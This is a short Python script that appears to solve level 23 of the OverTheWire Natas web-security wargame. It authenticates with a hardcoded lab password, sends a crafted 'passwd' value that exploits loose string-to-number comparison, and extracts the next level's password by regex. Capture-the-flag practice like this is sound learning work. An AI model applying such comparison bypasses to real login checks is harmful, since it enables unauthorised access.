import re
import requests
from requests.auth import HTTPBasicAuth 

def get_pass():
    auth = HTTPBasicAuth('natas23','D0vlad33nQF0Hz2EP255TP5wSW9ZsRSE')
    param = {'passwd':'20iloveyou'}
    r = requests.get('http://natas23.natas.labs.overthewire.org/', auth=auth, params=param)
    pass_regex = '[a-zA-Z0-9]{32}'
    print(re.findall(pass_regex,r.text)[1])
if __name__ == '__main__':
    get_pass()
